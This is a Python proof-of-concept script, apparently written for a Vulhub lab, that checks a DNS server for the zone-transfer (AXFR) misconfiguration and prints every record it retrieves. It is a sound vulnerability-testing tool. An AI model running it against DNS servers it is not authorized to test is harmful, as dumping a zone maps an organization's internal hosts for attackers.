#!/usr/bin/env python3
"""
DNS 域传送漏洞（AXFR）PoC
用法：
    python3 dns_axfr.py <DNS服务器IP> <域名>
示例：
    python3 dns_axfr.py 192.168.1.100 vulhub.org
"""

import sys
import dns.query
import dns.zone
import dns.resolver

def test_axfr(target, domain):
    """尝试对指定域名进行区域传送，并返回所有记录"""
    print(f'[*] 目标DNS服务器: {target}')
    print(f'[*] 请求域传送域名: {domain}')

    try:
        # 执行 AXFR 查询
        zone = dns.zone.from_xfr(dns.query.xfr(target, domain, timeout=10))
        if not zone:
            print('[-] 区域传送失败，未获取到任何记录')
            return False

        print(f'\n[+] 漏洞存在！成功获取区域文件，共 {len(zone.nodes)} 条记录：\n')
        # 按类型分组输出
        for name, node in sorted(zone.nodes.items()):
            for rdataset in node.rdatasets:
                for rdata in rdataset:
                    print(f'{str(name):<30} {rdataset.rdtype:<10} {rdata}')
        return True

    except dns.exception.FormError as e:
        print(f'[-] 区域传送被拒绝（FormError），服务器未开启或限制了 AXFR')
        return False
    except dns.exception.Timeout:
        print(f'[-] 连接超时，请检查目标 IP 和端口是否可达')
        return False
    except dns.query.TransferError as e:
        print(f'[-] 传输错误: {e}')
        return False
    except Exception as e:
        print(f'[-] 发生未知错误: {e}')
        return False


def main():
    if len(sys.argv) != 3:
        print(f'用法: {sys.argv[0]} <DNS服务器IP> <域名>')
        print(f'示例: {sys.argv[0]} 192.168.1.100 vulhub.org')
        sys.exit(1)

    target = sys.argv[1]
    domain = sys.argv[2]

    test_axfr(target, domain)


if __name__ == '__main__':
    main()